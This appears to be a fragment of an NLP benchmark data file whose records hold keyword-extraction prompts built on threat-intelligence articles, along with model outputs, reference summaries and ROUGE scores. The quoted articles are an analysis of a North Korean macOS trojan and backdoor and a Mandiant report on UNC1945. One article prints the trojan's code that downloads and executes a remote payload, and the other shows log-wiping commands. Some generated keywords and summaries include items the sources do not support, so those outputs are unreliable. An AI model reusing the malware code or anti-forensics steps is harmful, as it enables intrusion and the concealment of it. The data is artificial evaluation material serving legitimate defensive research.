"gpt3/lexical/rouge_rougeLsum": 0.2534246575342466, "gpt3_generated_text": ["The article discusses the characteristics of the Tildeb implant, a 32-Bit console Windows executable developed in C, with command-line arguments for communication with a C&C server. The implant can take various command line options, including specifying the IP/domain address and port number for connection. It also has a cleanup thread and main process cleanup code. The implant is not obfuscated and does not have anti-disassembly features. It may be delivered via lateral movement or other exploitation frameworks targeting Windows NT. The article provides insight into the functionality and delivery methods of the Tildeb implant."]}, {"split_name": "val", "sample_id": "val_132", "prompt_text": "Extract the keywords: objective-see.org /blog/blog_0x6E.htmlFrom The DPRK With Love - analyzing a recent north korean macOS backdoorby: Patrick Wardle / May 9, 2022BackgroundIn mid April, the Cybersecurity & Infrastructure Security Agency (CISA) published a report detailing \"[A] North Korean State-Sponsored APT Target[ing] Blockchain Companies\":The report begins with an informative overview of both the targets of, and techniques used the North Korean cyber actor (publicly known as Lazarus Group or APT38).The U.S. government has observed North Korean cyber actors targeting a variety of organizations in the blockchain technology and cryptocurrency industry The activity described in this advisory involves social engineering of victims using a variety of communication platforms to encourage individuals to download trojanized cryptocurrency applications on Windows or macOS operating systems. The cyber actors then use the applications to gain access to the victim\u2019s computer, propagate malware across the victim\u2019s network environment, and steal private keys or exploit other security gaps.These activities enable additional follow-on activities that initiate fraudulent blockchain transactions. -CISAMoreover, the report also (albeit rather briefly) describes the malicious applications targeting both Windows and Mac.The macOS samples listed in the CISA report, include:DAFOM-1.0.0.dmg TokenAIS.app.zip Specifically we\u2019ll focus on a sample distributed within a trojanized application named Esilet.Esilet: 1st-Stage The propensity of the North Koreans to target the cryptocurrency community via trojanized application is not new. Previous research on this includes:The CISA report notes that \"Esilet claims to offer live cryptocurrency prices and price predictions\".Objective-See: OSX.WatchCat SentinelOne: Four Distinct Families of Lazarus Malware Target Apple\u2019s macOS Platform \u2026which can be confirmed by running the (trojanized) application in a isolated Virtual Machine:The application is distributed via a disk image, named Esilet.dmg: % du -h ~/Malware/NukeSped/Esilet.dmg 78M /Users/patrick/Malware/NukeSped/Esilet.dmg% shasum -a256 ~/Malware/NukeSped/Esilet.dmg detections have (somewhat) increased since then:Esilet.dmg on VirusTotalYou can mount the disk image (via hdiutil), to extract its files: hdiutil attach /Users/patrick/Malware/TraderTraitor/Esilet.dmg -noverify/dev/disk6 GUID_partition_scheme /dev/disk6s1 Apple_HFS /Volumes/Esilet% ls /Volumes/Esilet Esilet.appOpening the mounted disk image (/Volumes/Esilet) in Finder reveals a application, named Esilet.app:3/18The application is not signed, and via the file utility we see its main executable is a standard 64-bit Mach-O binary (named Esilet): % codesign -dvv /Volumes/Esilet/Esilet.app /Volumes/Esilet/Esilet.app: code object is not signed at all% file /Volumes/Esilet/Esilet.app/Contents/MacOS/Esilet /Volumes/Esilet/Esilet.app/Contents/MacOS/Esilet: Mach-O 64-bit executable x86_644/18We can confirm CISA\u2019s findings that application is an Electon application, by looking at Esilet.app\u2019s dependencies via otool (noting Electron Framework.framework): % otool -L /Volumes/Esilet/Esilet.app/Contents/MacOS/Esilet /Volumes/Esilet/Esilet.app/Contents/MacOS/Esilet:/System/Library/Frameworks/MediaPlayer.framework/Versions/A/MediaPlayer @rpath/Electron Framework.framework/Electron Framework From a reversing point of view, this is good news. Why? Electron applications are rather trivial to analyze, Electon is, \u201ca framework for creating native applications with web technologies like JavaScript, HTML, as they (always?) ship with their original (JavaScript) source code. However this code may be archived and CSS.\u201d and thus, must first be unpacked. To learn more about Electon, head over to: If an Electron application is packed, the archive format is asar. From the asar github repo:\"Asar is a simple extensive archive format, it works like tar that concatenates all files together without compression, while having random access support.\"ElectronJS.org.As noted in a StackOver post titled, \u201cHow to unpack an .asar file?\u201d one can unpack an asar archive via the following: npx asar extract app.asar destfolder.In the Esilet.app we find an asar archive (app.asar) in Contents/Resources/ and extract it in the following manner: $ npx asar extract Esilet.app/Contents/Resources/app.asar asar(unpacked)The extracted archive contains various files, most notably several JavaScript files:5/18The CISA report notes:\"It contains a simpler version of TraderTraitor code in a function exported as UpdateCheckSync() located in a file named update.js, which is bundled in renderer.prod.js, which is in the app.asar archive.\" -CISALet\u2019s take a peek at the (beautified) renderer.prod.js files, specifically looking at the UpdateCheckSync function:1\"./app/update.js\": function(e, t, r) { 2 async function i() { 3 var e = \"/\"; 4 \"win32\" == r(\"os\").platform().toLowerCase() && (e = \"\\\\\"); 5 var t = r(\"os\").tmpdir(), 6 i = \"url\" + r(\"os\").platform() + \".json\", 7 n = t + e + \"Esilet-tmp\" + Math.random().toString(36).substring(8); 8 \"\\\\\" == e && (n += \".exe\"); 9 var o = t + e + \"noEsilet-0000\"; 10 try { 11 if (r(\"fs\").existsSync(o)) return; 12 request = r(\"./app/node_modules/request/index.js\"), request({ 13 rejectUnauthorized: !1, 14 url: i 15 }, (function(t, i, o) {6/1816 if (t || !i || 200 != i.statusCode) return; 17 var a = \"url\" + JSON.parse(o).path; 18 let s = r(\"fs\").createWriteStream(n); 19 request({ 20 rejectUnauthorized: !1, 21 url: a, 22 gzip: !0 23 }).pipe(s).on(\"finish\", () => { 24 \"\\\\\" != e && r(\"fs\").chmodSync(n, 511), r(\"child_process\").exec(n), setTimeout((function() { 25 console.log(n), r(\"child_process\").exec(n), console.log(n) 26 }), 12e3) 27 }).on(\"error\", e => {}) 28 })) 29 } catch (e) {} 30 } 31 e.exports = { 32 UpdateCheckSync: i, 33 UpdateCheckAsync: async function() { 34 await new Promise(e => { 39 },This code will be automatically executed when the user opens the trojanized application.The most relevant logic of the UpdateCheckSync function can be found around line 17. Here you can see the code builds a url (base url: url and then makes a request which is written out (to a path found in the n variable).On line 24, this downloaded file is executed, via exec(n).And what is downloaded (and executed)? The CISA report states:[the application] has been observed delivering payloads of at least two different macOS variants of Manuscrypt\" -CISALet\u2019s now take a look at the Manuscrypt (Nukesped) backdoor.Esilet: 2nd-StageAs the CISA report provides several hashes for what they refer to as the \u201cManuscrypt\u201d backdoor. (We\u2019ll stick with \u201cNukeSped\u201d, which seems to be the name that public AV-engines prefer).7/18The binary we\u2019ll focus on is named Esilet-tmpg7lpp. It is an unsigned 64-bit Mach-O binary: % shasum -a256 ~/Malware/NukeSped/Esilet-tmpg7lpp Esilet-tmpg7lpp: Mach-O 64-bit executable x86_64% codesign -dvv Esilet-tmpg7lpp Esilet-tmpg7lpp: code object is not signed at allThe binary was originally submitted to VirusTotal in late 2020 (via one of Objective-See\u2019s tools, which allows users to submit files directly to VirusTotal). Although it was originally undetected, detections have (somewhat) increased since then:Esilet-tmpg7lpp on VirusTotalWhen triaging an unknown (possibly) malicious binary, running strings (to extract, well, strings) can reveal a myriad of information: % strings - Esilet-tmpg7lppMozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10 Cookie: _ga=%s%02d%d%d%02d%s; gid=%s%02d%d%03d%s8/18Content-Type: application/octet-stream Content-Length: %d User-Agent: %s Cache-Control: no-cache Pragma: no-cache Connection: keep-alive <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"url\"> <plist version=\"1.0\"> <dict> <key>Label</key> <string>com.%s.agent</string> <key>ProgramArguments</key> <array> <string>%s</string> <string>daemon</string> </array> <key>KeepAlive</key> <false/> <key>RunAtLoad</key> /Library/LaunchDaemons/com.%s.agent.plist %s/Library/LaunchAgents/com.%s.agent.plist ProductVersion: %d.%d.%d networksetup -getwebproxy '%s' applex.services.agent9/18 url url url @_writeSolely from the strings output we can glean various information (that sure, should be be fully confirmed via continued analysis):User-agent strings used by the binary HTTP headers used by the binary, including (custom?) cookie values An embedded launch item property list Path for the launch item property list Shell commands likely for generating a survey URLs, likely command and control (or exfil) servers curl-related APIs for networking communications API related to executing commands, reading/writing files, etc. etc.10/18In short, it appears the the Esilet-tmpg7lpp is a persistent backdoor, that affords remote attackers continued access and capabilities on an infected system.Ok, enough static analysis, let\u2019s run Esilet-tmpg7lpp (in an isolated VM) and see what it does! The Lazarus Group are rather fond of using the libcurl APIs to provide networking capabilities for their Unsurprisingly, at least at the UI level, nothing appears amiss: implants/backdoors (e.g. OSX.WatchCat).\u2026behind the scenes though, is another storyVial a File Monitor we can passively observe the malware persisting itself as a launch item (agent): # FileMonitor.app/Contents/MacOS/FileMonitor \"timestamp\": \"2022-05-08 07:44:28 +0000\", \"/Users/user/Library/LaunchAgents/com.applex.services.agent.agent.plist\", \"path\": \"/Users/user/Desktop/Esilet-tmpg7lpp\", \"uid\": 501, \"arguments\": [\"/Users/user/Desktop/Esilet-tmpg7lpp\"], \"ppid\": 1380, \"ancestors\": [1380, 1379, 1377, 1], \"signing info (reported)\": { \"csFlags\": 0,11/18\"platformBinary\": 0, \"signing info (computed)\": { \"timestamp\": \"2022-05-08 07:44:28 +0000\", \"/Users/user/Library/LaunchAgents/com.applex.services.agent.agent.plist\", \"path\": \"/Users/user/Desktop/Esilet-tmpg7lpp\", \"uid\": 501, \"arguments\": [\"/Users/user/Desktop/Esilet-tmpg7lpp\"], \"ppid\": 1380, \"ancestors\": [1380, 1379, 1377, 1], \"signing info (reported)\": { \"signing info (computed)\": { }We can examine the malware\u2019s (now-created) launch agent property list (~/Library/LaunchAgents/com.applex.services.agent.agent.plist)1<?xml version=\"1.0\" encoding=\"UTF-8\"?> 2<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" >12/183<plist version=\"1.0\"> 4<dict> 5 <key>Label</key> 6 <string>com.applex.services.agent.agent</string> 7 <key>ProgramArguments</key> 8 <array> 9 <string>/Users/user/Desktop/Esilet-tmpg7lpp</string> 10 <string>daemon</string> 11 </array> 12 <key>KeepAlive</key> 13 <false/> 14 <key>RunAtLoad</key> 17</plist>Its a pretty standard persistent launch agent with:Name (Label): com.applex.services.agent.agent Path: Location where the malware was executed (e.g. ~/Desktop/Esilet-tmpg7lpp) RunAtLoad: Set to true ensuring the malware will be automatically (re)started each time the user logs in.Next, the malware attempts to beacon out to (one of) its command and control server for tasking. For example, it was observed attempting to connect to www.vinoymas.ch (which resolved to: capabilities.For example at 0x0000000100004A50 we find a function that after connecting to the server, contains a large switch statement that appears invoke various functions, based on commands received from the the server.__text:0000000100004B52 mov ecx, eax __text:0000000100004B54 sub ecx, 21279Eh __text:0000000100004B5A mov [rbp+task?], eax __text:0000000100004B5D jz loc_100004C80 __text:0000000100004B63 jmp $+5 __text:0000000100004B68 loc_100004B68: __text:0000000100004B68 mov eax, [rbp+task?] __text:0000000100004B6B sub eax, 2AFCB2h13/18__text:0000000100004B70 jz loc_100004C13 __text:0000000100004B76 jmp $+5 __text:0000000100004B7B loc_100004B7B: __text:0000000100004B7B mov eax, [rbp+task?] __text:0000000100004B7E sub eax, 38CE55h __text:0000000100004B83 jz loc_100004C3A __text:0000000100004B89 jmp $+5 __text:0000000100004B8E loc_100004B8E: __text:0000000100004B8E mov eax, [rbp+task?] __text:0000000100004B91 sub eax, 3A65F8h __text:0000000100004B96 jz loc_100004D3F __text:0000000100004B9C jmp $+5 __text:0000000100004BA1 loc_100004BA1: __text:0000000100004BA1 mov eax, [rbp+task?] __text:0000000100004BA4 sub eax, 3A6A93h __text:0000000100004BA9 jz loc_100004C5D __text:0000000100004BAF jmp $+5For example, if the instruction at line 0x0000000100004B6B (sub eax, 2AFCB2h, which operates on the tasking command from the server), results in a zero (e.g. a match), the jz (jump if zero flag is set) will be taken:__text:0000000100004B68 mov eax, [rbp+task?] __text:0000000100004B6B sub eax, 2AFCB2h __text:0000000100004B70 jz loc_100004C13The jump destination is loc_100004C13 which shortly thereafter calls a subroutine found at 0x0000000100002920This subroutine calls various other subroutines to generate an survey of the infected system. For example a subroutine at 0x0000000100004060 executes the sw_vers shell command to determine the (product and build) version of system:1var_2D0 = popen(\"sw_vers\", \"r\"); 2if (var_2D0 != 0x0) { 3 rax = fgets(&var_210, 0x200, var_2D0); 4 if (rax != 0x0) {14/185 rax = fgets(&var_210, 0x200, var_2D0); 6 if (rax != 0x0) { 7 sub_100003d30(&var_210); 8 rax = sscanf(&var_210, \"ProductVersion: %d.%d.%d\"); 9 var_2B4 = rax; 10 if (var_2B4 == 0x3) { 11 *(int32_t *)var_298 = 0x0; 12 *(int32_t *)var_2A0 = 0x0; 13 rax = fgets(&var_210, 0x200, var_2D0); 14 if (rax != 0x0) { 15 sub_100003d30(&var_210); 16 rax = sscanf(&var_210, \"BuildVersion: %x\"); 17 var_2B4 = rax; 18 if (var_2B4 == 0x1) { 19 *(int32_t *)var_2A8 = 0x0; 20 var_2B4 = 0x1; 26}\u2026thus we know the backdoor can be remotely tasked to generate a survey of an infected system.Another taskable subroutine is found at 0x00000001000036A0. It contains code to execute a shellcommand (or script) via /bin/bash -c:1;sub_1000036a0 4 var_74 = fork(); 5 if (var_74 >= 0x0) goto loc_100003755; 6 goto loc_100003bb0; 9 if (0x0 == var_74) { 10 close(var_10); 11 if (dup2(var_C, 0x1) < 0x0) { 12 exit(*(int32_t *)error()); 13 } 14 if (dup2(var_C, 0x2) < 0x0) { 15 exit(*(int32_t *)error());15/1816 } 17 var_30 = \"/bin/bash\"; 18 rax = execv(var_30, &var_30); 19 if (rax < 0x0) { 20 exit(*(int32_t *)error()); 21 } 22 exit(0x0); 23 }This affords remote attacker the ability to execute arbitrary commands on an infected system.Other taskable commands are what one would expect in a persistent backdoor (e.g. file read (and exfil), file write, etc. etc.).Esilet vs. Objective-See\u2019s ToolsWhenever new malware is uncovered, part of that analysis is to see how it stacks up against Objective- See\u2019s free, open-source macOS security tools.\u2026and if our tools don\u2019t fully detect or mitigate the malware, we then know how they can be improved!First off, let\u2019s talk about KnockKnock which enumerates persistently installed software to detect any persistent malware. Good news, when run, KnockKnock easily uncovers and flags the malware\u2019s launch agent:KnockKnock who's there?The metadata from the submission to VirusTotal reveals that the Esilet-tmpg7lpp binary, was initially Next, we have BlockBlock which monitors several common persistence locations. Its goal is to, at submitted via one of Objective-See's tools! How cool!? \ud83e\udd17 runtime, detect any malware that attempts to persist. And again, good news, BlockBlock detect the16/18malware when it attempts to persist as a launch agent When the tools detect something suspicious, the user can submitted the item to VirusTotal for analysis. (~/Library/LaunchAgents/com.applex.services.agent.agent.plist):BlockBlock block, blocking!Finally, we have LuLu our firewall, that can alert you about unauthorized network connections. And yes, it will alert you when the malware attempts to connect to its command and control server for tasking:LuLu, unauthorized network alertConclusion17/18A recent CISA report provided a comprehensive overview of recent North Korean (Lazarus Group) hacking techniques and tools.In this blog post, we dove deeper into the macOS malware used in these attacks, further detailing the malware\u2019s 1st and 2nd stage components, including persistence and capabilities.Finally we showed how Objective-See\u2019s heuristic-based tools easy thwarted this malware, even with no a priori knowledge!18/18 ", "generated_text": "a report; Cybersecurity & Infrastructure Security Agency; CISA; North Korean; Lazarus Group; APT38; the malware; social engineering; online platforms; users; trojanized cryptocurrency applications; Windows; macOS; malware; esilet.dmg; a disk image; Esilet.dmg; key; a ZIP folder; data; a command; control; command execution; access; the trojanized application; the cryptocurrency community; payloads; the malware; a keylogger; a backdoor; the trojanized application; Windows; a phishing email; a remote access; a password; a phishing email; Red Hat; a backdoor; a victim; stolen credentials; the victim; the backdoor; the attacker; the malware; a network; a unique password; a combination; the backdoor; an email address; a remote code execution path; a command; the malware; third; the backdoor; a new addition; compromise; the backdoor; the North Korean cyber actor; Lazarus Group; the attackers; tactics; their tactics; the cryptocurrency community.", "ref_text": "<START-1>The blog post analyzes a recent macOS malware sample called NukeSped distributed by the North Korean Lazarus Group. It is delivered in two stages - first via a trojanized cryptocurrency app, then by downloading the backdoor NukeSped. The initial app Esilet uses an Electron framework and JavaScript to check for updates which downloads the next stage malware. NukeSped persists as a launch agent and uses libcurl networking APIs to communicate with command and control servers. Analysis of NukeSped shows it is a full-featured backdoor capable of surveying the system, executing arbitrary commands, reading/writing files, and more based on commands from the C2 server. The author demonstrates how existing macOS security tools like KnockKnock, BlockBlock, and LuLu detect the malware's behaviors like persistence and network connections even without prior knowledge of this new threat. The tools provide effective heuristic detection and can block the malware. <END-1>", "t5/keyword/hint_hit_precision": 0.09523809523809523, "t5/word/hint_hit_recall": 0.06944444444444445, "gpt3/lexical/rouge_rouge1": 0.4142857142857143, "gpt3/lexical/rouge_rouge2": 0.0647482014388489, "gpt3/lexical/rouge_rougeL": 0.2, "gpt3/lexical/rouge_rougeLsum": 0.2, "gpt3_generated_text": ["The article discusses a recent North Korean macOS backdoor targeting the cryptocurrency community, as detailed in a report by the Cybersecurity & Infrastructure Security Agency (CISA). The malware, distributed through trojanized applications like Esilet.dmg, uses social engineering on online platforms to trick users into downloading malicious software on Windows and macOS. The trojanized application, Esilet, claims to offer live cryptocurrency prices and predictions. The application is not signed and contains an Electron framework, making it easy to analyze and unpack. The malware can steal private keys, propagate across networks, and initiate fraudulent blockchain transactions. This backdoor allows attackers to gain remote access, execute commands, and steal credentials from victims. The Lazarus Group, also known as APT38, is believed to be behind these attacks, utilizing phishing emails and other tactics to compromise the cryptocurrency community."]}, {"split_name": "val", "sample_id": "val_133", "prompt_text": "Extract the keywords: Live off the Land? How About Bringing Your Own Island? An Overview of UNC1945fireeye.com/blog/threat-research/2020/11/live-off-the-land-an-overview-of-unc1945.htmlThrough Mandiant investigation of intrusions, the FLARE Advanced Practices team observed a group we track as UNC1945 compromise managed service providers and operate against a tailored set of targets within the financial and professional consulting industries by leveraging access to third-party networks (see this blog post for an in-depth description of \u201cUNC\u201d groups).UNC1945 targeted Oracle Solaris operating systems, utilized several tools and utilities against Windows and Linux operating systems, loaded and operated custom virtual machines, and employed techniques to evade detection. UNC1945 demonstrated access to exploits, tools and malware for multiple operating systems, a disciplined interest in covering or manipulating their activity, and displayed advanced technical abilities during interactive operations.Mandiant discovered and reported to Oracle CVE-2020-14871, which was addressed in Oracle's October 2020 Critical Patch Update. Mandiant recommends staying current on all current patch updates to ensure a high security posture. We will discuss this vulnerability in greater detail in a follow up blog post.UNC1945 Attack LifecycleThe threat actor demonstrated experience and comfort by utilizing unique tactics, techniques and procedures (TTPs) within Unix environments, demonstrating a high level of acumen in conjunction with ease of operability in Microsoft Windows operating systems. They were successful navigating multiple segmented networks and leveraging third-party access to extend operations well beyond the initial victim. Furthermore, UNC1945 operated from several virtual machines pre-configured with post-exploitation tools in addition to their custom toolset to evade detection and forensics.Initial CompromiseIn late 2018, UNC1945 gained access to a Solaris server and installed a backdoor we track as SLAPSTICK in order to capture connection details and credentials to facilitate further compromise. The SSH service of this server was exposed to the internet at the time, the same time we observed first evidence of threat activity. Unfortunately, due to insufficient available evidence, the next indication of activity was in mid-2020 at which time a different Solaris server was observed connecting to the threat actor infrastructure. This indicates a dwell time of approximately 519 days based on recovered artifacts.Although we were unable to determine how the late-2018 initial access was accomplished, we did observe successful UNC1945 SSH connections directly to the victim Solaris 10 server, since the SSH service was exposed directly to the internet at the time.1/9In mid-2020, we observed UNC1945 deploy EVILSUN\u2014a remote exploitation tool containing a zero-day exploit for CVE-2020-14871\u2014on a Solaris 9 server. At the time, connections from the server to the threat actor IP address were observed over port 8080.Mandiant discovered and reported CVE-2020-14871, a recently patched vulnerability in the Oracle Solaris Pluggable Authentication Module (PAM) that allows an unauthenticated attacker with network access via multiple protocols to exploit and compromise the operating system. According to an April 2020 post on a black-market website, an \u201cOracle Solaris SSHD Remote Root Exploit\u201d was available for approximately $3,000 USD, which may be identifiable with EVILSUN. Additionally, we confirmed a Solaris server exposed to the internet had critical vulnerabilities, which included the possibility of remote exploitation without authentication.Establish Foothold and Maintain PersistenceThe threat actor used a Solaris Pluggable Authentication Module backdoor we refer to as SLAPSTICK to establish a foothold on a Solaris 9 server. This facilitated user access to the system with a secret hard-coded password and allowed the threat actors to escalate privileges and maintain persistence (see Figure 1).Log \u2013font \u2013unix | /usr/lib/ssh/sshd sshd kbdint - can <Encoded Password> <IP REDACTED> Magical Password auth.info | sshd[11800]: [ID 800047 auth.info] Accepted keyboard-interactive for root from <IP REDACTED> port 39680 ssh2 auth.notice | su: [ID 366847 auth.notice] \u2018su root\u2019 - succeeded for netcool on /dev/pts/31Figure 1: SLAPSTICK logsAt the initial victim, UNC1945 placed a copy of a legitimate pam_unix.so file and SLAPSTICK in the /lib64/security folder. A day later, the threat actor positioned a custom Linux backdoor, which Mandiant named LEMONSTICK, on the same workstation. LEMONSTICK capabilities include command execution, file transfer and execution, and the ability to establish tunnel connections. (see Figure 2).FileItem:changed | /usr/lib64/security/pam_unix,so [57720] Audit log | [audit_type: USER_END] user pid=10080 uid=0 auid=0 msg='PAM: FileItem:Accessed | /var/tmp/.cache/ocb_staticFigure 2: UNC1945 emplacement of SLAPSTICK2/9UNC1945 obtained and maintained access to their external infrastructure using an SSH Port Forwarding mechanism despite the host lacking accessibility to the internet directly. SSH Port Forwarding is a mechanism implemented in SSH protocol for transporting arbitrary networking data over an encrypted SSH connection (tunneling). This feature can be used for adding encryption to legacy applications traversing firewalls or with malicious intent to access internal networks from the the internet. The UNC1945 configurations we observed are similarly structured with respect to the host alias, specified options, and option order (see Figure 3).config1config2Host <redacted> UserKnownHostsFile /dev/null UserKnownHostsFile /dev/null RemoteForward 2224 <redacted>:22Figure 3: SSH config files used by UNC1945 at different incidentsAs part of this multi-stage operation, UNC1945 dropped a custom QEMU Virtual Machine (VM) on multiple hosts, which was executed inside of any Linux system by launching a \u2018start.sh\u2019 script. The script contained TCP forwarding settings that could be used by the threat actor in conjunction with the SSH tunnels to give direct access from the threat actor VM to the command and control server to obfuscate interaction with customer infrastructure. The VM was running a version of the Tiny Core Linux OS with pre-loaded scripts and tools. Also, we analyzed the Virtual Machine file system timestamps, which coincided with UNC1945's overall operational timeline.The VM contained numerous tools such as network scanners, exploits and reconnaissance tools. Tiny Core Linux pre-loaded tools included Mimikatz, Powersploit, Responder, Procdump, CrackMapExec, PoshC2, Medusa, JBoss Vulnerability Scanner and more.Efforts to decrease operational visibility included placing tool and output files within temporary file system mount points that were stored in volatile memory. Additionally, UNC1945 used built-in utilities and public tools to modify timestamps and selectively manipulate Unix log files.UNC1945 employed anti-forensics techniques with the use of a custom ELF utility named LOGBLEACH. The actor used built-in Linux commands to alter the timestamps of files and directories and used LOGBLEACH to clean logs to thwart forensic analysis, as seen in Figure 4.3/9$ ./b -C -y -a $ mv b /usr/lib64/libXbleach.so.1 $ cd /usr/lib64/ $ touch -acm -r librpmio.so.3.2.2 $ touch -acm -r libyaml-0.so.2Figure 4: LOGBLEACHTo further obfuscate activity, a Linux ELF packer named STEELCORGI was executed in memory on the Solaris system. The malware contains various anti-analysis techniques, including anti-debugging, anti-tracing, and string obfuscation. It uses environment variables as a key to unpack the final payload.Escalate Privileges and Lateral MovementAfter successfully establishing a foothold, UNC1945 collected credentials, escalated privileges, and successfully moved laterally through multiple networks.UNC1945 obtained credentials via SLAPSTICK and open source tools such as Mimikatz, which enabled easy lateral movement throughout networks to obtain immediate access to other segments of the network and third-party environments. Stolen credentials collected by SLAPSTICK were used to traverse the customer network via SSH and deploy SLAPSTICK to additional hosts. After successfully authenticating, SLAPSTICK displays a welcome message, as seen in Figure 5.Figure 5: SLAPSTICK backdoor welcome bannerUNC1945 used ProxyChains to download PUPYRAT, an open source, cross-platform multi-functional remote administration and post-exploitation tool mainly written in Python.At one target, the threat actor used a virtual machine to initiate a brute-force of SSH targeting Linux and HP-UX endpoints. Beginning with seemingly random usernames and shifting to legitimate Linux and Windows accounts, the threat actor successfully established SSH connections on a Linux endpoint. After successfully escalating privileges on an HP-UX endpoint and a Linux endpoint, UNC1945 installed three backdoors: SLAPSTICK, TINYSHELL, and OKSOLO.We observed UNC1945 use IMPACKET with SMBEXEC in a Microsoft Windows environment to execute commands remotely without the need to upload a payload to the target. SMBEXEC allows the threat actor to operate like PsExec, but without using RemComSvc. There are two main modes of using this tool that benefits attackers. Share mode allows the specification of a share that everything will be executed through. Server mode permits the output of the executed commands to be sent back by the target machine into a locally shared folder.4/9At one victim, we observed UNC1945 moving laterally via Remote Desktop Protocol (RDP) to a Windows server before viewing the Server Manager Panel, viewing and modifying RDP-related system firewall rules and checking the application settings of two endpoint security services.Internal ReconnaissanceMandiant investigations found that the threat actor maintains various tools to interact with victim networks. In addition to custom tools, the UNC1945 VMs contained various tools (e.g. network scanners, exploits and reconnaissance; see Associated Tools and Malware section).In some intrusions, UNC1945 employed a SPARC executable identified as a reconnaissance tool. Based on publicly available information, this executable could be referred to as Luckscan or BlueKeep, the latter of which is part of the BKScan toolkit (see Figure 6).Figure 6: SPARC executable recon tool command line used by the threat actorAccording to open sources, BlueKeep, aka \u201cbkscan\u201d scanner, works both unauthenticated and authenticated (i.e. when Network Level Authentication is enabled). BlueKeep (CVE- 2019-0708) is a security vulnerability that was discovered in Microsoft's Remote Desktop Protocol (RDP) implementation, which allows for the possibility of remote code execution.Complete MissionDespite this multi-staged operation, Mandiant did not observe evidence of data exfiltration and was unable to determine UNC1945's mission for most of the intrusions we investigated. In at least one case, we observed ROLLCOAST ransomware deployment in the final phase of the threat actor activity, but Mandiant didn\u2019t attribute this activity to UNC1945. At this time, it is likely that access to the victim environment was sold to another group.ConclusionThe ease and breadth of exploitation in which UNC1945 conducted this campaign suggests a sophisticated, persistent actor comfortable exploiting various operating systems, and access to resources and numerous toolsets. Given the aforementioned factors, use of zero-day exploits and virtual machines, and ability to traverse multiple third-party networks, Mandiant expects this motivated threat actor to continue targeted operations against key industries while taking advantage of operating systems that likely have inadequate security visibility.5/9Associated Tools and Malware FamiliesEVILSUN is a remote exploitation tool that gains access to Solaris 10 and 11 systems of SPARC or i386 architecture using a vulnerability (CVE-2020-14871) exposed by SSH keyboard-interactive authentication. The remote exploitation tool makes SSH connections to hosts passed on the command line. The default port is the normal SSH port (22), but this may be overridden. EVILSUN passes the banner string SSH-2.0-Sun_SSH_1.1.3 over the connection in clear text as part of handshaking.LEMONSTICK is a Linux executable command line utility with backdoor capabilities. The backdoor can execute files, transfer files, and tunnel connections. LEMONSTICK can be started in two different ways: passing the `-c` command line argument (with an optional file) and setting the \u2018OCB\u2019 environment variable. When started with the `-c` command line argument, LEMONSTICK spawns an interactive shell. When started in OCB mode, LEMONSTICK expects to read from STDIN. The STDIN data is expected to be encrypted with the blowfish algorithm. After decrypting, it dispatches commands based on the name \u2014for example: \u2018executes terminal command\u2019, \u2018connect to remote system\u2019, \u2018send & retrieve file\u2019, \u2018create socket connection\u2019.LOGBLEACH is an ELF utility that has a primary functionality of deleting log entries from a specified log file(s) based on a filter provided via command line. The following log files are hard coded in the malware, but additional log paths may be specified:/var/run/utmp /var/log/wtmp /var/log/btmp /var/log/lastlog /var/log/faillog /var/log/syslog /var/log/messages /var/log/secure /var/log/auth.logOKSOLO is a publicly available backdoor that binds a shell to a specified port. It can be compiled to support password authentication or dropped into a root shell.OPENSHACKLE is a reconnaissance tool that collects information about logged-on users and saves it to a file. OPENSHACKLE registers Windows Event Manager callback to achieve persistence.ProxyChains allows the use of SSH, TELNET, VNC, FTP and any other internet application from behind HTTP (HTTPS) and SOCKS (4/5) proxy servers. This \"proxifier\" provides proxy server support to any application.PUPYRAT (aka Pupy) is an open source, multi-platform (Windows, Linux, OSX, Android), multi-function RAT (Remote Administration Tool) and post-exploitation tool mainly written in Python. It features an all-in-memory execution guideline and leaves6/9very low footprint. It can communicate using various transports, migrate into processes (reflective injection), and load remote Python code, Python packages and Python C- extensions from memory.STEELCORGI is a packer for Linux ELF programs that uses key material from the executing environment to decrypt the payload. When first starting up, the malware expects to find up to four environment variables that contain numeric values. The malware uses the environment variable values as a key to decrypt additional data to be executed.SLAPSTICK is a Solaris PAM backdoor that grants a user access to the system with a secret, hard-coded password.TINYSHELL is a lightweight client/server clone of the standard remote shell tools (rlogin, telnet, ssh, etc.), which can act as a backdoor and provide remote shell execution as well as file transfers.DetectionsFE_APT_Trojan_Linux_STEELCORGI_1 HackTool.Linux.EVILSUN.MVX HXIOC UUID: e489ce60-f315-4d1a-a888-77782f687eec EVILSUN (FAMILY) 90005075FE_Trojan_Linux_LEMONSTICK_1 HXIOC UUID: 4a56fb0c-6134-4450-ad91-0f622a92701c OPENSHACKLE (UTILITY) 90005006 HXIOC, 45632ca0-a20b-487f-841c-c74ca042e75a; ROLLCOAST RANSOMWARE (FAMILY) Mandiant experts from the FLARE team will present an in-depth view into UNC1945 on Thursday, Nov. 12. Register today to reserve your spot for this discussion, where the presenters from FLARE and Mandiant Managed Defense will also answer questions from the audience. Finally, for more intelligence on these types of threats, please register for Mandiant Advantage Free, a no-cost version of our threat intelligence platform.9/9 ", "generated_text": "UNC1945; Managed service providers; financial and professional consulting industries; access; third-party networks; late 2018; access; tools; utilities; Windows; Linux; custom virtual machines; techniques; evade detection; late 2020; a Solaris server; CVE-2020-14871; October 2020; infrastructure; a foothold; a Solaris 9 server; a zero-day exploit; CVE-2020-14871; a Solaris Pluggable Authentication Module; PAM; access; access; persistence; the system; a secret hard-coded password; persistence; access; the system; a secret hard-coded password; persistence; a foothold; persistence; the user; capabilities; the malware; defense; the threat actor; businesses; organizations.", "ref_text": "<START-1>The report describes the activities of a threat actor group tracked as UNC1945 by Mandiant researchers. UNC1945 targeted financial and professional consulting organizations by compromising managed service providers and moving laterally through networks. Initial access was gained in late 2018 by exploiting a Solaris server exposed to the internet. The actor used custom backdoors like SLAPSTICK and LEMONSTICK to establish persistence. A zero-day exploit called EVILSUN was used to compromise Solaris servers. UNC1945 escalated privileges using 